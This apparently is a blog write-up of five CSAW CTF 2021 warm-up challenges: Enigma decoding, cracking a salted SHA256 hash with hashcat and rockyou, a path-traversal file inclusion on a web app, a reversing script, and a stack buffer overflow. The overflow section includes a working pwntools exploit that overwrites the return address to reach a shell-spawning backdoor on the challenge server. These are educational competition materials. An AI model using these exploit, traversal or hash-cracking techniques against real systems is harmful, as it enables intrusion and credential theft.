+++
title = "CSAW CTF Qualification Round 2021 - warm-up"
date = 2021-09-13
[taxonomies]
categories = ["ctfs"]
tags = ["csawctf2021"]
+++

# Turing

## Task description

Recruiting the next Turing. See if you can break this historic cipher! Ciphertext: `jmodtrr_tdwumtu_cydy_ynsldf` You might need this: M3 UKW B

## Solution

[enigma online decoder](https://cryptii.com/pipes/enigma-decoder) \
foreign chars: include

flag: `flag{scruffy_looking_nerf_herder}`

# Crack Me

## Task description

Can you crack this? Your hash: `a60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c`. Your salt: the encryption method of the hash. (So if the hash is of the word example, you would submit flag{example} to score points.) UPDATE Friday 9PM: To streamline your efforts we would like to give you some more details about the format for the hash encryption method. An example: if you think the hash is RIPEMD-128, use ripemd128 for the salt.

## Solution

Using [hash identifier](https://hashes.com/en/tools/hash_identifier) I found out that it's a SHA256 hash.

Then I created a file for hashcat with the possible hashes (that was before the hint was added).

```
A60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c:sha256
A60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c:SHA256
```

And run it on the rockyou wordlist (-m flag explained [here](https://hashcat.net/wiki/doku.php?id=example_hashes)): \
`hashcat -m 1420 --show hashes.txt /usr/share/wordlists/rockyou.txt`

The output: \
`a60458d2180258d47d7f7bef5236b33e86711ac926518ca4545ebf24cdc0b76c:sha256:cathouse`

Therefore, the flag is: `flag{cathouse}`

# poem-collection

## Task description

Hey! I made a cool website that shows off my favorite poems. See if you can find flag.txt somewhere!

## Solution

Unfortunately, the organizers took the ctf's infrastructure down right after it ended but basically the site was printing out a file based on the parameter poem. For example: `http://web.chal.csaw.io:5003/poems/?poem=poem.txt`. In addition, the first time you browse to the site (without any parameter) you see this warning `Warning: file_get_contents(): Filename cannot be empty in /var/www/html/poems/index.php on line 4`.

My first try was: `http://web.chal.csaw.io:5003/poems/?poem=index.php` which dumped the site's code. Then I just tried out `flag.txt` and `../flag.txt` which worked.

The flag: `flag{l0c4l_f1l3_1nclusi0n_f0r_7h3_w1n}`

# Password Checker

## Task description

Charlie forgot his password to login into his Office portal. Help him to find it. (This challenge was written for the person on your team who has never solved a binary exploitation challenge before! Welcome to pwning.)

[password_checker](/files/csawctf2021/warm-up/password_checker)

## Solution

Opening it up in ghidra, we see this decompiled code:

```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  init(param_1);
  password_checker();
  return 0;
}

void password_checker(void)
{
  undefined8 local_a8;
  undefined local_a0;
  char local_78 [48];
  char local_48 [60];
  int local_c;

  printf("Enter the password to get in: \n>");
  gets(local_48);
  strcpy(local_78,local_48);
  local_a8 = 0x64726f7773736170;
  local_a0 = 0;
  local_c = strcmp(local_78,(char *)&local_a8);
  if (local_c == 0) {
    printf("You got in!!!!");
  }
  else {
    printf("This is not the password");
  }
  return;
}
```

In addition, we find a very convenient function included.

```c
void backdoor(void)
{
  system("/bin/sh");
  return;
}
```

So, the password checking thing is a diversion, what we're really interested in is the fact that the application uses `gets` to read the line. Buffer overflow!

Now, to the exploitation. First, generate a cyclic pattern a bit longer than the buffer `gets` writes to:

```
pwn cyclic 80
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
```

Then, run load the app in gdb and enter the pattern. We get the expected segfault. Let's read the $rsp:

```
(gdb) x/x $rsp
0x7fffffffdf28: 0x61616173
```

Get the length:

```
pwn cyclic -l 0x61616173
72
```

The last thing we need is the backdoor function's address:

```
(gdb) info address backdoor
Symbol "backdoor" is at 0x401172 in a file compiled without debugging.
```

The exploit:

```py3
from pwn import *

# io = process("./password_checker")
io = remote("pwn.chal.csaw.io", 5000)

payload = b"A" * 72 # or just use cyclic_find(0x61616173)
payload += p64(0x00401172)

io.sendline(payload)

io.interactive()
```

The flag: `flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}`

# checker

## Task description

What's up with all the zeros and ones? Where are my letters and numbers? (This is a reversing challenge.)

[checker.py](/files/csawctf2021/warm-up/checker.py)

## Solution

I just reversed the algorithm in the main function by adding these lines after the definition of the encrypted flag:

```py3
encoded = encoded[::-1]
encoded = right(encoded, 24)
encoded = down(encoded)
encoded = right(encoded, len(encoded) - 24)

for i in range(0, len(encoded), 8):
    c = int(encoded[i : i + 8], base=2)
    print(chr(c >> 1), end="")
```

The flag: `flag{r3vers!nG_w@rm_Up}`
